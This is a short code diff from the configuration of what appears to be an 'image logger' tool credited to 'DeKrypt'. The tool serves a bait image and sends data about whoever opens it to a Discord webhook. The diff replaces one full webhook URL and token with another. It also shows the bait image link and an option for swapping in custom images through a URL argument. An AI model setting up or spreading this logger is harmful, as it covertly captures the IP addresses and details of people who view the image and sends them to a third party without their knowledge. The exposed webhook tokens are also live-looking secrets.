@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1335110618709233826/Qs3M7xhemdLq5qvZIWyS3emQZMs-NNQKGmLdCTpG24nvEwtY4QKh_k6fEHGhVf48fNr4",
+    "webhook": "https://discord.com/api/webhooks/1356930824846577804/HWuqN-xQkFEvJYIO0OqrHAYVyxLCnZrzCzCyvcsZvqm7oWTrzvzCX_NMEZH0YZLWhBPO",
     "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.jammable.com%2Fcustom-dreamybull&psig=AOvVaw1D8bfRtTu0_gcU0qRxMWln&ust=1738472896469000&source=images&cd=vfe&opi=89978449&ved=0CBQQjRxqFwoTCMDFwcHaoYsDFQAAAAAdAAAAABAE", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
